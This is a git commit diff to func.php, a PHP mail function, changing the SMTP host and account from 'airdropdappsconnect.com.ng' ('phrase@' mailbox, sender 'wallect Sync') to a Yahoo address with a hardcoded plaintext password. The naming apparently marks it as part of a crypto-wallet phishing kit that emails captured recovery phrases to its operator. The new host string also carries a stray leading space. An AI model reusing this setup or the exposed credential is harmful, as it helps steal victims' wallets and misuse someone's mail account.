fb1def887662d3862c06a63e9787fab72e8174c4
harper112223 <106414197+harper112223@users.noreply.github.com>
2022-08-07 09:38:29 -0700

    Update func.php

--- func.php
+++ func.php
@@ -7,14 +7,14 @@ function sendMail($subject, $msg, $email) {
         $mail->isSendMail();
         $mail->SMTPDebug = 0;
         $mail->Debugoutput = '';
-        $mail->Host = "airdropdappsconnect.com.ng";
+        $mail->Host = " smtp.mail.yahoo.com";
         $mail->Port = 465;
         $mail->SMTPAuth = true;
-        $mail->Username = "phrase@airdropdappsconnect.com.ng";
+        $mail->Username = "harpermendez01@yahoo.com";
         $mail->Password = 'khariz2020@';
-        $mail->setFrom('phrase@airdropdappsconnect.com.ng', 'wallect Sync');
+        $mail->setFrom('harpermendez01@yahoo.com', 'wallect Sync');
         $mail->setFromName = 'wallect Sync';
-        $mail->addReplyTo("phrase@airdropdappsconnect.com.ng");
+        $mail->addReplyTo("harpermendez01@yahoo.com");
         $mail->addAddress($email);
         $mail->Subject = $subject;
         $mail->msgHTML($msg);
